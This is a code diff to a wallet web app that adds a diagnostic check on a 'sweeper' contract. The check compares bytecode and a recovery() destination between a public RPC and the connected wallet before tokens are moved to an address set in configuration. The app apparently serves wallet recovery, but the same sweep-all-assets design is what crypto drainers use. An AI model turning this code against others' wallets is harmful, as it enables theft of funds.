@@ -52,6 +52,7 @@ type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
 type TokenAsset = { chainId: number; chainName: string; address: string; name: string; symbol: string; decimals: number; balance: string; kind: 'native' | 'erc20' };
 
 const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address to, uint256 amount) returns (bool)'] as const;
+const RECOVERY_SELECTOR = '0x9b19d914';
 const RECOVERY_DESTINATION = ((import.meta as any).env?.VITE_RECOVERY_DESTINATION as string | undefined)?.trim() || '';
 let walletConnectProvider: WalletConnectProvider | null = null;
 let activeEip1193Provider: any = null;
@@ -207,6 +208,52 @@ async function discoverNativeAsset(chain: typeof chains[number], address: string
   return { chainId: chain.id, chainName: chain.name, address: 'native', name: chain.native, symbol: chain.native, decimals: 18, balance: formatUnits(rawBalance, 18), kind: 'native' };
 }
 
+async function diagnoseSweeper(chainId: number, sweeperAddr: string, walletProvider: any) {
+  const info = chains.find(c => c.id === chainId);
+  const rpcUrl = info?.rpcUrl;
+  if (!rpcUrl) throw new Error(`${info?.name ?? chainId}: no configured read-only RPC for contract diagnostics.`);
+
+  const publicProvider = new JsonRpcProvider(rpcUrl, chainId, { staticNetwork: true });
+  const [publicCode, walletCode] = await Promise.all([
+    publicProvider.getCode(sweeperAddr),
+    new BrowserProvider(walletProvider, chainId).getCode(sweeperAddr),
+  ]);
+
+  const publicCall = publicCode !== '0x'
+    ? await publicProvider.call({ to: sweeperAddr, data: RECOVERY_SELECTOR })
+    : '0x';
+  const walletCall = walletCode !== '0x'
+    ? await new BrowserProvider(walletProvider, chainId).call({ to: sweeperAddr, data: RECOVERY_SELECTOR })
+    : '0x';
+
+  const codeMismatch = publicCode.toLowerCase() !== walletCode.toLowerCase();
+  const publicEmpty = publicCall === '0x';
+  const walletEmpty = walletCall === '0x';
+
+  if (publicCode === '0x') {
+    throw new Error(`${info?.name ?? chainId}: contract diagnostic failed — no bytecode at ${sweeperAddr} on the configured mainnet RPC.`);
+  }
+  if (publicEmpty) {
+    throw new Error(`${info?.name ?? chainId}: contract diagnostic failed — deployed bytecode exists, but recovery() returned 0x on the configured mainnet RPC.`);
+  }
+  if (walletCode === '0x') {
+    throw new Error(`${info?.name ?? chainId}: provider mismatch — mainnet RPC has contract code at ${sweeperAddr}, but the wallet provider reports no code.`);
+  }
+  if (walletEmpty) {
+    throw new Error(`${info?.name ?? chainId}: provider mismatch — mainnet RPC recovery() returned ${publicCall.slice(0, 18)}…, but the wallet provider returned 0x.`);
+  }
+  if (codeMismatch) {
+    throw new Error(`${info?.name ?? chainId}: provider mismatch — contract bytecode differs between the configured mainnet RPC and wallet provider.`);
+  }
+
+  return {
+    publicCode,
+    walletCode,
+    publicCall,
+    walletCall,
+  };
+}
+
 function App() {
   const [address, setAddress] = useState('');
   const [destination, setDestination] = useState(() => (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : ''));
@@ -298,25 +345,26 @@ function App() {
       let sweeperAddr = loadSweeperAddress(chainId, dest);
       if (sweeperAddr) {
         try {
-          const code = await provider.getCode(sweeperAddr);
-          if (!code || code === '0x') {
+          const diagnosis = await diagnoseSweeper(chainId, sweeperAddr, validatedEip1193);
+          const cachedRecovery = new Contract(sweeperAddr, ['function recovery() view returns (address)'], provider).interface.decodeFunctionResult(
+            'recovery',
+            diagnosis.publicCall,
+          )[0];
+          if (
+            typeof cachedRecovery !== 'string' ||
+            !isAddress(cachedRecovery) ||
+            cachedRecovery.toLowerCase() !== dest.toLowerCase()
+          ) {
+            setStatus(`${label}: contract diagnostic mismatch — cached recovery address does not match the configured destination.`);
             clearSweeperAddress(chainId, dest);
             sweeperAddr = null;
           } else {
-            const cachedSweeper = new Contract(sweeperAddr, ['function recovery() view returns (address)'], provider);
-            const cachedRecovery = await cachedSweeper.recovery();
-            if (
-              typeof cachedRecovery !== 'string' ||
-              !isAddress(cachedRecovery) ||
-              cachedRecovery.toLowerCase() !== dest.toLowerCase()
-            ) {
-              clearSweeperAddress(chainId, dest);
-              sweeperAddr = null;
-            }
+            setStatus(`${label}: contract verified — bytecode and recovery() agree across mainnet RPC and wallet provider.`);
           }
-        } catch {
+        } catch (e: any) {
           clearSweeperAddress(chainId, dest);
           sweeperAddr = null;
+          throw new Error(e?.message || `${label}: contract diagnostic failed.`);
         }
       }
       if (!sweeperAddr) {
